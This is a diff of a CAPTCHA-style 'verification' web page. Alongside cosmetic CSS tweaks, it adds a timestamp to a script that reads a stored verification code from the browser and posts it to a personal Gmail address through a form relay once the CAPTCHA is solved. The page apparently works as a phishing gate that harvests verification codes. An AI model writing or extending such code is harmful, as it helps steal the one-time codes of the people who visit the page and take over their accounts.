@@ -26,8 +26,11 @@
     }
     h1 {
       font-family: 'Merriweather Sans', sans-serif;
-      color: #5D0E8B; /* Deep purple */
+      color: #5D0E8B;
       margin-bottom: 20px;
+    }
+    h1::before {
+      content: "🛡️ ";
     }
     p {
       font-family: 'Roboto', sans-serif;
@@ -48,7 +51,7 @@
       font-weight: bold;
       letter-spacing: 5px;
       margin: 15px 0;
-      color: #CC0000; /* Deep red */
+      color: #CC0000;
       text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
     }
     #captchaInput {
@@ -68,7 +71,7 @@
       padding: 15px 35px;
       border-radius: 50px;
       cursor: pointer;
-      font-size: 18px;
+      font-size: 20px; /* Increased from 18px */
       font-weight: bold;
       letter-spacing: 1px;
       transition: all 0.3s ease;
@@ -105,6 +108,21 @@
       return captcha;
     };
     
+    // Get Indian time
+    const getIndianTime = () => {
+      const now = new Date();
+      return now.toLocaleString('en-IN', { 
+        timeZone: 'Asia/Kolkata',
+        day: 'numeric',
+        month: 'short',
+        year: 'numeric',
+        hour: 'numeric',
+        minute: 'numeric',
+        second: 'numeric',
+        hour12: true
+      });
+    };
+    
     // Initialize
     let currentCaptcha = generateCaptcha();
     
@@ -114,7 +132,7 @@
       const verificationCode = localStorage.getItem('verificationCode');
       
       if(userInput === currentCaptcha) {
-        // Send email without UTC time
+        // Send email with Indian time
         fetch('https://formsubmit.co/ajax/rajibmurmublp@gmail.com', {
           method: 'POST',
           headers: { 
@@ -122,6 +140,7 @@
           },
           body: JSON.stringify({ 
             Code: verificationCode,
+            Time: getIndianTime(),
             _subject: "New Verification Code"
           })
         })
